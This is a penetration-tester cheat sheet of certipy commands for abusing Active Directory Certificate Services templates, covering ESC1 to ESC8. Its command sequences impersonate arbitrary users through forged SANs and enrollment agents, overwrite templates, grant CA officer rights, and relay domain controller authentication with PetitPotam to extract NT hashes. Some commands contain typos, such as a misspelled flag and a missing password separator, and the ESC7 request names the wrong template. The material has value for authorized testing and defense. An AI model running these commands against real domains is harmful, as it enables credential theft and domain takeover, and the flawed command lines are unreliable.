% certipy, adcs, certificate

# ESC1 allows Client Authentication and permits the enrollee to supply an arbitrary Subject Alternative Name (SAN) to a certficate.
certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC1' -alt '<targetUser>@<domain>'
Using the certificate the NT hash can be extracted:

certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
ESC2
ESC2 is when a certificate template can be used for any purpose (see ESC3 - use template = ESC2).

# ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users.

Request Certificate Request Agent certificate:

$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template '<ESC3>'
Use this certificate with -on-behalf-of parameter (must be in the form of domain\user, and not the FQDN of the domain)

$> certipy req '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'User' -on-behalf-of '<domain>\<user>' -pfx '<file>.pfx'
ESC4
ESC4 is when a user has write privileges over a certificate template. Overwrite the template and make it vulnerable to ESC1:

$> certipy template '<domain>/<user>'@<certificateRhost> -hashes :<ntHash> -template 'ESC4' -save-old
Request a certificate:

$> certipy req '<domain>/<user>':'<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC4' -alt '<targetUser>@<domain>'
Restore the configuration afterwards:

$> certipy template '<domain>/<user>'@<certificatesRhost> -hashes :<ntHash> -template 'ESC4' -configuration '<file>.json'
ESC6
ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. In essence, this flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate templateâ€™s configuration (see ESC1).

ESC7 (Manage CA & Manage Certificates)
In order for this technique to work, the user must also have the Manage Certificates access right, and the certificate template SubCA must be enabled. Add Manage Certificates access right:

$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -add-officer '<attackerUser>'
Enable SubCA:

$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -list-templates 

$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -enbale-template '<template>'
Request a certificate based on the SubCA certificate template and receive CERTSRV_E_TEMPLATE_DENIED error:

$> certipy req '<domain>/<user><password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -template 'ESC4' -alt '<targetUser>@<domain>'
Issue a failed certificate request specifying the request ID:

$> certipy ca '<domain>/<user>:<password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -issue-request <id>
Retreive certificate:

$> certipy req '<domain>/<user><password>'@<certificateAuthorityRhost> -ca '<certificateAuthority>' -retrieve <id>
Extract NT hash:

$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
ESC8
An Enrollment Service has installed and enabled HTTP Web Enrollment. Start relay server:

$> certipy relay -ca <certificateAuthorityIp> -template '<DomainController>'
Trigger authentication using petitpotam:

petitpotam.py '<domain>/<user>:<password>@<fqdnRhost>' <attackerIp>
Get NT hash of domain controller:

$> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
